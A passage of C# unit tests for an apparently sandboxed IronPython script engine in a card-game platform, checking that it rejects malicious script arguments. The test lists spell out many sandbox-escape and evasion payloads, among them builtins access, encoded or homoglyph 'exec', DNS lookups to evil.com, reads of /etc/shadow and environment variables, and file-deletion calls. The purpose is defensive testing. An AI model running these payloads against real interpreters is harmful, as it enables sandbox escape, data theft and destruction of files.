                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block serialization exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_DotNetCryptographyBypass_BlocksCryptographicAttacks()
        {
            var exploits = new[]
            {
                "System.Security.Cryptography.ProtectedData.Unprotect(data, entropy, scope)",
                "System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(buffer)",
                "System.Security.Cryptography.RSACryptoServiceProvider()",
                "System.Security.Cryptography.X509Certificates.X509Store()",
                "System.Security.Principal.WindowsIdentity.GetCurrent()",
                "System.Security.Principal.WindowsPrincipal(identity)",
                "System.Security.AccessControl.FileSecurity()",
                "System.Security.Permissions.SecurityPermission()"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block cryptography exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_WhitespaceAndEncodingEvasion_BlocksWhitespaceVariations()
        {
            var exploits = new[]
            {
                // Tab variations
                "import\tos",
                "exec\t('print(1)')",
                "\timport\tsys",
                "Player(1)\t;\texec('evil')",
                
                // Space variations  
                "import  os",
                "exec   ('print(1)')",
                "   import   sys   ",
                "Player(1)  ;  exec('evil')",
                
                // Mixed whitespace
                "import\t os",
                "exec \t('print(1)')",
                "Player(1) \t; \texec('evil')",
                
                // Non-breaking spaces and Unicode whitespace
                "import\u00A0os", // Non-breaking space
                "exec\u2000('print(1)')", // En quad
                "import\u2003sys", // Em space
                "exec\u2009('evil')", // Thin space
                
                // Vertical whitespace
                "import\vos",
                "exec\f('print(1)')",
                
                // Multiple types combined
                "import\t\n\r os",
                "exec\t \n('print(1)')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block whitespace evasion exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_AdvancedEncodingEvasion_BlocksEncodedExploits()
        {
            var exploits = new[]
            {
                // Hex encoding
                "Player(1), \\x65\\x78\\x65\\x63", // "exec" - should be blocked
                "\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f('os')", // "__import__" - should be blocked
                "Player(1), \\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73, Card(2)", // "import os" - should be blocked
                
                // Octal encoding
                "Player(1), \\145\\170\\145\\143", // "exec" - should be blocked
                "\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137('os')", // "__import__" - should be blocked
                
                // Unicode escapes
                "Player(1), \\u0065\\u0078\\u0065\\u0063, Card(2)", // "exec" - should be blocked
                "\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f('os')", // "__import__" - should be blocked
                
                // String concatenation with encoding
                "Player(1), 'ex' + 'ec', Card(2)", // Should block the dangerous concatenation
                "Player(1), chr(101) + chr(120) + chr(101) + chr(99), Card(2)", // "exec" via chr - should be blocked
            };

            foreach (var exploit in exploits)
            {
                // All encoded exploits should be blocked with security exception
                Assert.Throws<ScriptSecurityException>(() =>
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Should have blocked encoded exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_AdvancedPythonSyntaxEvasion_BlocksSyntaxVariations()
        {
            var exploits = new[]
            {
                // Alternative import syntax
                "__import__('os')",
                "importlib.import_module('os')",
                "importlib.__import__('os')",
                "imp.load_source('os', '/path/to/os.py')",
                "imp.find_module('os')",
                
                // Eval variations
                "eval('exec(\"print(1)\")')",
                "eval(compile('import os', '<string>', 'exec'))",
                "compile('exec(\"evil\")', '<string>', 'exec')",
                "exec(compile('import os', '<string>', 'exec'))",
                
                // Getattr/setattr bypass
                "getattr(__builtins__, 'exec')",
                "getattr(__builtins__, '__import__')",
                "object.__getattribute__(__builtins__, 'exec')",
                "vars(__builtins__)['exec']",
                
                // Alternative builtins access
                "__builtins__.__dict__['exec']",
                "__builtins__['__import__']",
                "globals()['__builtins__']['exec']",
                "locals()['__builtins__']['exec']",
                
                // Function construction
                "type(lambda: None)(compile('import os', '', 'exec'), {})()",
                "(lambda: exec('import os'))()",
                "eval.__class__.__call__(eval, 'import os')",
                
                // Class/metaclass abuse  
                "type('Evil', (), {'__init__': lambda self: exec('import os')})()",
                "class Evil(type): pass",
                "type.__call__(type, 'Evil', (), {})",
                
                // Iterator/generator abuse
                "(exec('import os') for x in [1])",
                "[exec('import os') for x in [1]]",
                "next(exec('import os') for x in [1])",
                
                // Exception abuse
                "try: 1/0\nexcept: exec('import os')",
                "raise Exception(exec('import os'))",
                
                // Context manager abuse
                "with open('/dev/null') as f: exec('import os')",
                
                // Decorator abuse
                "@property\ndef evil(self): exec('import os')",
                
                // List/dict comprehension
                "{exec('import os'): 1 for x in [1]}",
                "[exec('import os') for x in [1]]",
                
                // Operator overloading
                "''.__class__.__add__('exec', '(\"evil\")')",
                "''.__class__.__mul__('exec', 1)",
                
                // Advanced attribute access
                "'exec'.__class__.__subclasshook__",
                "str.__dict__['format']",
                "object.__subclasses__()",
                
                // Memory/type manipulation
                "id(exec)",
                "type(exec)",
                "exec.__code__",
                "exec.__globals__",
                
                // Alternative execution contexts
                "exec('import os', {})",
                "eval('import os', {})",
                "exec('import os', globals(), locals())"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block syntax evasion exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonSpecificBypass_BlocksIronPythonInternals()
        {
            var exploits = new[]
            {
                // IronPython-specific modules
                "import IronPython",
                "import Microsoft.Scripting",
                "import Microsoft.Dynamic",
                "from IronPython.Runtime import *",
                "from Microsoft.Scripting.Hosting import *",
                
                // IronPython engine access
                "IronPython.Hosting.Python.CreateEngine()",
                "IronPython.Hosting.Python.CreateRuntime()",
                "Microsoft.Scripting.Hosting.ScriptRuntime.CreateEngine",
                
                // IronPython compiler access
                "IronPython.Compiler.PythonCompilerOptions()",
                "IronPython.Runtime.PythonContext.GetEngine()",
                
                // DLR access
                "Microsoft.Dynamic.DynamicMetaObject",
                "Microsoft.Scripting.Actions.CallSite",
                "System.Linq.Expressions.Expression",
                
                // IronPython builtins manipulation
                "IronPython.Runtime.Builtin.exec",
                "IronPython.Runtime.Builtin.__import__",
                "IronPython.Runtime.Operations.PythonOps",
                
                // IronPython type system abuse
                "IronPython.Runtime.Types.PythonType",
                "IronPython.Runtime.Types.OldClass",
                "IronPython.Runtime.Operations.InstanceOps",
                
                // Script scope manipulation
                "Microsoft.Scripting.Hosting.ScriptScope",
                "scope.SetVariable('exec', malicious_func)",
                "scope.GetVariable('__builtins__')",
                
                // Engine execution bypass
                "engine.CreateScriptSourceFromString(malicious)",
                "engine.Execute(malicious_code)",
                "source.Execute(scope)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block IronPython internal exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ArgumentInjectionTechniques_BlocksArgumentManipulation()
        {
            var exploits = new[]
            {
                // Argument concatenation - these should be blocked due to dangerous arguments
                "Player(1), exec('evil'), Card(2)",
                "Player(1); exec('evil'); Card(2)",
                "Player(1), __import__('os'), Card(2)",
                
                // Mixed legitimate and dangerous arguments
                "Card(123), import os, Player(456)",
                "Player(1), eval('malicious'), 'legitimate string'",
            };

            foreach (var exploit in exploits)
            {
                // These should throw SecurityException due to dangerous arguments
                var ex = Assert.Throws<ScriptSecurityException>(() =>
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Should have blocked dangerous arguments in: {exploit}");
                    
                Assert.That(ex.SecurityReason, Contains.Substring("Invalid argument detected"),
                    $"Security exception should mention invalid argument for: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_AdvancedWhitespaceEvasion_BlocksAllWhitespaceVariants()
        {
            var exploits = new[]
            {
                // All Unicode space characters
                "import\u0009os", // Tab
                "import\u000Aos", // Line feed
                "import\u000Bos", // Vertical tab
                "import\u000Cos", // Form feed
                "import\u000Dos", // Carriage return
                "import\u001Cos", // File separator
                "import\u001Dos", // Group separator
                "import\u001Eos", // Record separator
                "import\u001Fos", // Unit separator
                "import\u0020os", // Space
                "import\u0085os", // Next line
                "import\u00A0os", // Non-breaking space
                "import\u1680os", // Ogham space mark
                "import\u2000os", // En quad
                "import\u2001os", // Em quad
                "import\u2002os", // En space
                "import\u2003os", // Em space
                "import\u2004os", // Three-per-em space
                "import\u2005os", // Four-per-em space
                "import\u2006os", // Six-per-em space
                "import\u2007os", // Figure space
                "import\u2008os", // Punctuation space
                "import\u2009os", // Thin space
                "import\u200Aos", // Hair space
                "import\u2028os", // Line separator
                "import\u2029os", // Paragraph separator
                "import\u202Fos", // Narrow no-break space
                "import\u205Fos", // Medium mathematical space
                "import\u3000os", // Ideographic space
                
                // Mixed whitespace combinations
                "import\t\n\r\v\f os",
                "exec\u0020\u00A0\u2000('evil')",
                "Player(1)\u0009\u000A;\u0020exec('evil')",
                
                // Whitespace in keywords
                "im\u0020port os",
                "ex\u0009ec('evil')",
                "__im\u00A0port__('os')",
                
                // Zero-width characters (if supported)
                "import\u200Bos", // Zero width space
                "import\u200Cos", // Zero width non-joiner
                "import\u200Dos", // Zero width joiner
                "import\uFEFFos"  // Zero width no-break space (BOM)
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block advanced whitespace exploit: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_CommentBasedEvasion_BlocksCommentTricks()
        {
            var exploits = new[]
            {
                // Comments with dangerous content
                "Player(1) # import os",
                "Player(1) # exec('evil')",
                "Player(1) # ; import sys; sys.exit()",
                "Player(1) # \\nimport os\\nos.system('calc')",
                
                // Multi-line comment tricks
                "Player(1) \"\"\"\nimport os\n\"\"\"",
                "Player(1) '''\nexec('evil')\n'''",
                
                // Comment injection with line continuation  
                "Player(1) \\\n# import os",
                "Player(1) \\\r\n# exec('evil')",
                
                // Mixed comment styles
                "Player(1) # comment \"\"\"\nimport os\n\"\"\"",
                "Player(1) # comment '''\nexec('evil')\n'''",
                
                // Comments with escape sequences
                "Player(1) # comment \\n import os",
                "Player(1) # comment \\r\\n exec('evil')",
                
                // Docstring abuse
                "def evil():\n    \"\"\"import os\"\"\"\n    pass",
                "class Evil:\n    '''exec(\"malicious\")'''",
                
                // Comment only (should be blocked)
                "# import os",
                "# exec('evil')",
                "# ; malicious code here",
                
                // Comments with Unicode
                "Player(1) # comment with \\u0020import\\u0020os",
                "Player(1) # \\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73", // "import os" in hex
                
                // Nested comment structures
                "Player(1) # outer # inner import os",
                "Player(1) # comment /* import os */", // C-style in Python comment
                
                // Comment with continuation
                "Player(1) # comment \\\nexec('evil')",
                "Player(1) # comment \\\r\nexec('evil')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block comment-based exploit: {exploit}");
            }
        }

        #endregion

        #region Advanced Evasion and Timing Attacks

        [Test]
        public void ExecuteFunctionSecureNoFormat_TimingAndSideChannelAttacks_BlocksTimingAttacks()
        {
            var exploits = new[]
            {
                // Time-based attacks
                "time.sleep(10000)",
                "__import__('time').sleep(10000)",
                "threading.Event().wait(10000)",
                "System.Threading.Thread.Sleep(10000)",
                
                // Resource exhaustion
                "[0] * (10**8)", // Memory bomb
                "range(10**8)", // Range bomb
                "'a' * (10**8)", // String bomb
                "while True: pass", // Infinite loop
                "for i in range(10**8): pass", // Long loop
                
                // Recursive attacks
                "def recursive(): recursive()",
                "lambda f: f(f)",
                "sys.setrecursionlimit(10**6)",
                
                // Threading attacks
                "threading.Thread(target=exec, args=('import os',))",
                "concurrent.futures.ThreadPoolExecutor()",
                "multiprocessing.Process(target=exec, args=('import os',))",
                
                // Signal handling
                "signal.signal(signal.SIGINT, handler)",
                "signal.alarm(10000)",
                
                // I/O blocking
                "input('blocking')", // Blocks for user input
                "sys.stdin.read()",
                "open('/dev/random').read(1000000)" // Potentially blocking read
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block timing attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_CovertChannelAttacks_BlocksCovertChannels()
        {
            var exploits = new[]
            {
                // DNS-based exfiltration
                "socket.gethostbyname('data.evil.com')",
                "socket.getaddrinfo('exfil.evil.com', 80)",
                "System.Net.Dns.GetHostAddresses('evil.com')",
                
                // Error-based information leakage
                "1/0 if secret else 1/1", // Conditional exception
                "assert secret == 'password', 'wrong'",
                "raise ValueError(secret)",
                
                // Timing-based information leakage
                "time.sleep(len(secret))",
                "hash(secret) % 1000000", // Hash timing
                
                // File system probing
                "os.path.exists('/etc/shadow')",
                "glob.glob('/etc/*')",
                "os.listdir('/')",
                
                // Process probing
                "psutil.process_iter()",
                "os.getpid()",
                "os.getppid()",
                
                // Environment probing
                "os.environ",
                "sys.path",
                "sys.modules",
                "platform.platform()",
                
                // Registry access (Windows)
                "winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE')",
                "_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE')",
                
                // WMI queries
                "wmi.WMI().Win32_Process()",
                "subprocess.check_output(['wmic', 'process', 'list'])"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block covert channel attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_SteganographyAndHiding_BlocksHiddenPayloads()
        {
            var exploits = new[]
            {
                // Zero-width character hiding
                "exec\u200B('evil')", // Zero-width space
                "exec\u200C('evil')", // Zero-width non-joiner
                "exec\u200D('evil')", // Zero-width joiner
                "exec\uFEFF('evil')", // Zero-width no-break space
                
                // Right-to-left override (can hide malicious code)
                "exec\u202E('evil')",
                "import\u202Eos",
                
                // Look-alike character substitution
                "еxec('evil')", // Cyrillic 'е' instead of 'e'
                "imрort os", // Cyrillic 'р' instead of 'p'
                "ехес('evil')", // Mixed Cyrillic
                
                // Homograph attacks in function names
                "еxеc('evil')", // All Cyrillic
                "exec\u0430('evil')", // Cyrillic 'a'
                
                // Hidden in string literals
                "'normal string'; exec('hidden'); 'normal end'",
                "\"visible\" + '; exec(\"hidden\"); ' + \"text\"",
                
                // Base64 hiding (even if blocked, variations)
                "import codecs; codecs.decode('ZXhlYygnZXZpbCcp', 'base64')",
                "'aW1wb3J0IG9z'.decode('base64')", // Python 2 style
                
                // ROT13 hiding
                "import codecs; codecs.decode('vzcbeg bf', 'rot13')",
                "codecs.encode('exec', 'rot13')",
                
                // Hexadecimal hiding
                "bytes.fromhex('696d706f7274206f73').decode()",
                "int('696d706f7274206f73', 16)",
                
                // Compression hiding
                "import zlib; zlib.decompress(compressed_payload)",
                "import gzip; gzip.decompress(payload)",
                
                // Pickle hiding
                "pickle.loads(malicious_pickle)",
                "cPickle.loads(payload)",
                
                // Hidden execution in formatting
                "'{}'.format(exec('evil'))",
                "'%s' % exec('evil')",
                "f'{exec(\"evil\")}'",
                
                // Hidden in data structures
                "{'exec': exec}['exec']('evil')",
                "[exec][0]('evil')",
                "(exec,)[-1]('evil')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block steganography attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_PolymorphicAndMetamorphic_BlocksCodeMutation()
        {
            var exploits = new[]
            {
                // Self-modifying code patterns
                "globals()['ex' + 'ec'] = lambda x: __import__('os').system(x)",
                "setattr(__builtins__, 'evil', exec)",
                "vars(__builtins__)['evil'] = exec",
                
                // Dynamic function creation
                "type(lambda: None)((lambda: None).__code__, {})",
                "types.FunctionType(code_object, globals())",
                
                // Code object manipulation
                "(lambda: None).__code__.replace(co_code=malicious_bytecode)",
                "compile('exec(\"evil\")', '<string>', 'exec')",
                
                // String manipulation to build dangerous calls
                "''.join(['e', 'x', 'e', 'c'])",
                "chr(101) + chr(120) + chr(101) + chr(99)", // "exec"
                "bytes([101, 120, 101, 99]).decode()", // "exec"
                
                // Reverse string building
                "'cexe'[::-1]", // "exec" reversed
                "'so tropmi'[::-1]", // "import os" reversed
                
                // Caesar cipher / ROT
                "''.join(chr(ord(c) + 1) for c in 'dwdb')", // "exec" with Caesar +1
                
                // Bit manipulation
                "'exec'.encode().hex()",
                "int.from_bytes(b'exec', 'big')",
                
                // Mathematical obfuscation  
                "chr(101) + chr(120) + chr(101) + chr(99)", // ASCII to "exec"
                "str(chr(0x65) + chr(0x78) + chr(0x65) + chr(0x63))", // Hex to "exec"
                
                // List/tuple unpacking obfuscation
                "(*'exec',)", 
                "*['e', 'x', 'e', 'c']",
                
                // Dict key manipulation
                "{'exec': exec}[list({'exec': 1}.keys())[0]]",
                
                // Function attribute manipulation
                "exec.__name__", 
                "exec.__doc__",
                "exec.__code__",
                
                // Module manipulation
                "sys.modules['builtins'].exec",
                "importlib.import_module('builtins').exec",
                
                // Operator overloading for obfuscation
                "'exec'.__class__.__name__",
                "str.__add__('ex', 'ec')",
                
                // Memory address manipulation
                "ctypes.cast(id(exec), ctypes.py_object).value"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block polymorphic attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ProtocolAndParsingAttacks_BlocksParsingExploits()
        {
            var exploits = new[]
            {
                // Null byte injection
                "exec\x00('evil')",
                "import\x00 os",
                "Player\x00(1)",
                
                // Control character injection
                "exec\x01('evil')",
                "import\x02os",
                "Player\x03(1)",
                
                // Line ending confusion
                "Player(1)\r\nexec('evil')",
                "Player(1)\n\rexec('evil')",
                "Player(1)\r\nimport os",
                
                // Parser confusion with mixed encodings
                "Player(1); \u0065\u0078\u0065\u0063('evil')",
                
                // Long argument attack
                "'A' * 10000",
                "Player(" + "'A' * 10000" + ")",
                
                // Nested structure attacks
                "[[[[[[exec('evil')]]]]]]",
                "((((((exec('evil'))))))",
                "{{{{{exec('evil'): 1}}}}}",
                
                // Parser stack overflow
                new string('(', 1000) + "exec('evil')" + new string(')', 1000),
                new string('[', 1000) + "exec('evil')" + new string(']', 1000),
                
                // Tokenizer confusion
                "Player(1)#\nexec('evil')",
                "Player(1)\\\nexec('evil')", // Line continuation
                
                // Quote confusion
                "Player('1\\')\nexec('evil')",
                "Player(\"1\\\")\nexec('evil')",
                
                // Encoding declaration attacks (Python)
                "# -*- coding: utf-8 -*-\nexec('evil')",
                "# coding=utf-8\nexec('evil')",
                
                // Shebang attacks
                "#!/usr/bin/python\nexec('evil')",
                "#!python\nexec('evil')",
                
                // BOM attacks
                "\uFEFFexec('evil')", // UTF-8 BOM
                "\uFFFEexec('evil')", // UTF-16 BOM
                
                // Mixed line endings
                "Player(1)\r\nexec('evil')\n\rimport os",
                
                // Escaped newlines in strings
                "Player('1\\n')\nexec('evil')",
                
                // Raw string confusion
                "r'Player(1)'\nexec('evil')",
                
                // Format string confusion
                "f'Player({1})'\nexec('evil')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block parsing attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_StateAndContextAttacks_BlocksContextManipulation()
        {
            var exploits = new[]
            {
                // Global state manipulation
                "globals().clear()",
                "globals().update({'exec': evil_exec})",
                "del globals()['__builtins__']",
                
                // Local state manipulation  
                "locals().clear()",
                "locals().update({'exec': evil_exec})",
                
                // Frame manipulation
                "sys._getframe()",
                "inspect.currentframe()",
                "frame.f_globals",
                "frame.f_locals",
                
                // Exception state manipulation
                "sys.exc_info()",
                "sys.last_value",
                "sys.last_traceback",
                
                // Module state manipulation
                "sys.modules.clear()",
                "del sys.modules['os']",
                "sys.modules['evil'] = malicious_module",
                
                // Import hook manipulation
                "sys.meta_path.clear()",
                "sys.path_hooks.clear()",
                "sys.path.insert(0, '/evil/path')",
                
                // Codec manipulation
                "codecs.register(malicious_codec)",
                "encodings._cache.clear()",
                
                // Warning filter manipulation
                "warnings.resetwarnings()",
                "warnings.filterwarnings('ignore')",
                
                // Random state manipulation
                "random.setstate(malicious_state)",
                "numpy.random.set_state(evil_state)",
                
                // Hash randomization bypass
                "os.environ['PYTHONHASHSEED'] = '0'",
                "hash.hash_info",
                
                // Garbage collector manipulation
                "gc.disable()",
                "gc.set_debug(gc.DEBUG_UNCOLLECTABLE)",
                "gc.get_objects()",
                
                // Reference counting manipulation
                "sys.getrefcount(obj)",
                "weakref.ref(obj, callback)",
                
                // Memory manipulation
                "ctypes.string_at(address, size)",
                "ctypes.memmove(dest, src, count)",
                "ctypes.memset(ptr, value, size)",
                
                // Signal handler manipulation
                "signal.signal(signal.SIGTERM, handler)",
                "signal.setitimer(signal.ITIMER_REAL, 0.1)",
                
                // Thread local storage
                "threading.local()",
                "contextvars.ContextVar('evil')",
                
                // Audit hook manipulation
                "sys.addaudithook(malicious_hook)",
                "sys.audit('exec', code)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block state manipulation attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ConcurrencyAttacks_BlocksConcurrentExploits()
        {
            var exploits = new[]
            {
                // Threading exploits
                "threading.Thread(target=exec, args=('import os',)).start()",
                "concurrent.futures.ThreadPoolExecutor().submit(exec, 'import os')",
                "threading.Timer(1, exec, ['import os']).start()",
                
                // Multiprocessing exploits
                "multiprocessing.Process(target=exec, args=('import os',)).start()",
                "multiprocessing.Pool().apply(exec, ('import os',))",
                "multiprocessing.Queue().put(exec)",
                
                // Asyncio exploits
                "asyncio.run(async_exec('import os'))",
                "asyncio.create_task(coro)",
                "asyncio.get_event_loop().run_until_complete(coro)",
                
                // Queue-based attacks
                "queue.Queue().put(exec)",
                "queue.LifoQueue().put(exec)",
                "queue.PriorityQueue().put((1, exec))",
                
                // Lock manipulation
                "threading.Lock().acquire()",
                "threading.RLock().acquire()",
                "threading.Semaphore().acquire()",
                
                // Event manipulation
                "threading.Event().set()",
                "threading.Condition().notify_all()",
                "threading.Barrier(1).wait()",
                
                // Shared memory attacks
                "multiprocessing.shared_memory.SharedMemory('evil')",
                "mmap.mmap(-1, 1000)",
                
                // Cross-thread communication
                "threading.current_thread()",
                "threading.active_count()",
                "threading.enumerate()",
                
                // Process communication
                "multiprocessing.Pipe()",
                "multiprocessing.Manager()",
                "multiprocessing.Value('i', 0)",
                
                // Signal-based coordination
                "signal.pause()",
                "signal.sigwait([signal.SIGUSR1])",
                
                // Resource sharing
                "threading.local().exec = exec",
                "contextvars.copy_context().run(exec, 'import os')"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block concurrency attack: {exploit}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_IronPythonMetaObjectAttacks_BlocksMetaObjectExploits()
        {
            var exploits = new[]
            {
                // DLR Meta Object manipulation
                "Microsoft.Dynamic.DynamicMetaObject",
                "Microsoft.Scripting.Actions.DynamicSiteHelpers",
                "Microsoft.Scripting.Runtime.DynamicOperations",
                
                // IronPython-specific meta programming
                "IronPython.Runtime.Types.PythonType.MakeGenericType",
                "IronPython.Runtime.Types.ReflectedType.MakeGenericMethod",
                "IronPython.Runtime.Operations.PythonOps.MakeClass",
                
                // Expression tree manipulation
                "System.Linq.Expressions.Expression.Call",
                "System.Linq.Expressions.Expression.Lambda",
                "System.Linq.Expressions.Expression.Compile",
                
                // CallSite manipulation
                "Microsoft.Scripting.Actions.CallSite.Create",
                "System.Runtime.CompilerServices.CallSite.Create",
                
                // Dynamic method generation
                "System.Reflection.Emit.DynamicMethod",
                "System.Reflection.Emit.ILGenerator.Emit",
                
                // Lightweight code generation
                "Microsoft.Scripting.Generation.LightLambda",
                "Microsoft.Scripting.Generation.LightCompiler",
                
                // IronPython internal operations
                "IronPython.Runtime.Builtin.exec",
                "IronPython.Runtime.Builtin.eval",
                "IronPython.Runtime.Builtin.compile",
                
                // Scope manipulation
                "Microsoft.Scripting.Hosting.ScriptScope.SetVariable",
                "Microsoft.Scripting.Hosting.ScriptScope.Engine",
                
                // Engine manipulation
                "IronPython.Hosting.Python.CreateEngine",
                "Microsoft.Scripting.Hosting.ScriptRuntime.CreateEngine",
                
                // Context manipulation
                "IronPython.Runtime.PythonContext.CreateModule",
                "IronPython.Runtime.CodeContext",
                
                // Hosting API abuse
                "Microsoft.Scripting.Hosting.ScriptHost",
                "Microsoft.Scripting.Hosting.ObjectOperations"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
                    $"Failed to block meta object attack: {exploit}");
            }
        }

        #endregion

        #region Specific Reported Exploits

        [Test]
        public void ExecuteFunctionSecureNoFormat_EdgeCaseArguments_HandlesEdgeCases()
        {
            // Test various edge cases that should be allowed
            var legitimateArgs = new[]
            {
                "", // Empty arguments
                "None", // None value
                "True", // Boolean true
                "False", // Boolean false
                "42", // Integer
                "3.14", // Float
                "\"\"", // Empty string
                "\"normal string\"", // Normal string
                "'single quotes'", // Single quoted string
                "[]", // Empty list
                "[1, 2, 3]", // Simple list
                "Player(123)", // Valid OCTGN object
                "Card(456)", // Valid OCTGN object
                "table", // Valid reference
            };

            foreach (var arg in legitimateArgs)
            {
                // These should NOT throw exceptions
                Assert.DoesNotThrow(() =>
                {
                    _engine.ExecuteFunctionSecureNoFormat("whisper", arg);
                }, $"Legitimate argument should be allowed: {arg}");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_VeryLongArguments_HandlesLongInput()
        {
            // Test very long but legitimate arguments
            var longString = new string('A', 10000);
            var longArgs = new[]
            {
                $"\"{longString}\"", // Very long string
                string.Join(", ", Enumerable.Repeat("Player(1)", 100)), // Many valid objects
                $"Player({string.Join("", Enumerable.Repeat("1", 1000))})" // Very long number
            };

            foreach (var arg in longArgs)
            {
                // Should handle long arguments without issues
                Assert.DoesNotThrow(() =>
                {
                    _engine.ExecuteFunctionSecureNoFormat("whisper", arg);
                }, $"Long legitimate argument should be handled: {arg.Substring(0, Math.Min(50, arg.Length))}...");
            }
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_MalformedButHarmless_HandlesMalformed()
        {
            var malformedArgs = new[]
            {
                "Player(", // Unclosed parenthesis
                "Player(1, 2, 3, 4, 5, 6, 7, 8, 9)", // Too many args
                "Card()", // No arguments
                "\"unclosed string", // Unclosed string
                "Player(1, Card(2, Player(3)))", // Nested but wrong structure
                "[Player(1], Card(2)]", // Mismatched brackets
                "Player(1) Card(2)", // Missing comma
            };

            foreach (var arg in malformedArgs)
            {
                // Malformed arguments should be treated as security violations
                // In a security context, anything that's not clearly valid should be rejected
                Assert.Throws<ScriptSecurityException>(() =>
                    _engine.ExecuteFunctionSecureNoFormat("whisper", arg),
                    $"Malformed argument should be rejected as security violation: {arg}");
            }
        }

        #endregion

        #region Specific Reported Exploits

        [Test]
        public void ExecuteFunctionSecureNoFormat_ReportedFileDeleteExploit_IsBlocked()
        {
            // This tests the specific exploit: _api.RemoteCall(players[1]._id, "whisper", "IO.File.Delete('C:/Test/test.txt')")
            var exploit = "IO.File.Delete('C:/Test/test.txt')";
            
            Assert.Throws<ScriptSecurityException>(() => 
                _engine.ExecuteFunctionSecureNoFormat("whisper", exploit));
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_ReportedMultilineImportExploit_IsBlocked()
        {
            // This tests the specific exploit with multiline import and System namespace access
            var exploit = @"""
                import System
                System.IO.File.Delete(r""C:\\Test\\test.txt"")#
                """;
            
            Assert.Throws<ScriptSecurityException>(() => 
                _engine.ExecuteFunctionSecureNoFormat("remoteCall", exploit));
        }

        [Test]
        public void ExecuteFunctionSecureNoFormat_VariationsOfFileDeleteExploit_AreAllBlocked()
        {
            // Test various ways someone might try to delete files
            var exploits = new[]
            {
                "IO.File.Delete('C:/Test/test.txt')",
                "System.IO.File.Delete('C:/Test/test.txt')",
                "__import__('os').remove('test.txt')",
                "__import__('shutil').rmtree('C:/Test')",
                "open('test.txt', 'w').close(); __import__('os').remove('test.txt')",
                "import System; System.IO.File.Delete('test.txt')",
                "from System.IO import File; File.Delete('test.txt')",
                "__import__('pathlib').Path('test.txt').unlink()",
                "__import__('tempfile').NamedTemporaryFile(delete=True)"
            };

            foreach (var exploit in exploits)
            {
                Assert.Throws<ScriptSecurityException>(() => 
                    _engine.ExecuteFunctionSecureNoFormat("whisper", exploit),
